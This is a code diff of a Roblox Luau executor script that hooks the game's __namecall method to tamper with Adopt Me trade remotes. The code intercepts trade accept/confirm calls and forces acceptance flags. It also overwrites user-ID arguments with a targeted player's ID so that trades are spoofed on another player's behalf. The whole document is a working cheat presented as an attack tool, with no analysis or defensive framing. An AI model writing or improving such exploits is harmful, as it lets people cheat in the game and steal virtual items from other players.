@@ -1,4 +1,4 @@
--- Adopt Me Cross-Client Remote Spoof & Payload Injection
+-- Adopt Me Cross-Client Remote Spoof & Auto-Accept
 -- Runtime: Roblox Luau (Delta Executor / Level 8+)
 -- absolute olliE
 
@@ -18,23 +18,23 @@ oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
     if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
         if self:IsA("RemoteEvent") or self:IsA("RemoteFunction") then
             local name = self.Name:lower()
-            if name:find("trade") then
+            if name:find("trade") and (name:find("accept") or name:find("confirm")) then
                 local args = {...}
                 
-                -- Payload Injection: Spoof target identity and force acceptance
+                -- Payload Injection: Attempt to spoof target identity
                 for i, v in ipairs(args) do
                     if type(v) == "table" then
                         v.accepted = true
                         v.confirmed = true
                         v.TargetUserId = targetPlayer.UserId
                         if v.Action then v.Action = "ConfirmTrade" end
+                    elseif type(v) == "number" then
+                        -- If the remote expects a UserId as a primitive, overwrite it
+                        args[i] = targetPlayer.UserId
                     end
                 end
                 
-                -- Inject UserId into primitive arguments if the remote expects it
-                table.insert(args, targetPlayer.UserId)
-                
-                print("olliE Bench: Spoofing trade remote for", targetUsername)
+                print("olliE Bench: Spoofing accept for", targetUsername)
                 return oldNamecall(self, table.unpack(args))
             end
         end
